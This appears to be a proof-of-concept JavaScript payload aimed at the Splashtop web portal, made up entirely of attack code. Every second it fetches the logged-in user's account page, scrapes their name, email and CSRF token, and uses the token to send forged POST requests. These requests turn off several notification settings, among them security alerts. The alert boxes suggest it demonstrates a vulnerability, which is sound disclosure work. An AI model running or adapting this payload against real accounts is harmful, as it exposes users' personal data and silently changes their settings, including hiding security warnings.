setInterval(function(){
    try {
    fetch('https://my.splashtop.com/account_info/').then(d => d.text()).then(d => {
    let name = (new RegExp('<h5 class="display-name" title="([^"]+)">').exec(d)[1])
    let email = (new RegExp('<p class="email" title="([^"]+)"').exec(d)[1])
    alert(`Your name is '${name}' and email is ${email}`)
  
    let csrf = (new RegExp('<meta name="csrf-token" content="([^"]+)"').exec(d)[1])
    Array.from(['news', 'announcement', 'promotion', 'security_alerts']).map(xx => {
      alert(`Toggled off setting: ${xx}`)
      fetch('https://my.splashtop.com/ajax/messages/update_kind', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Csrf-Token': csrf
        },
        body: `kind=${xx}&flag=0`,
      })
    })
  })
  } catch(e){}
  }, 1000)
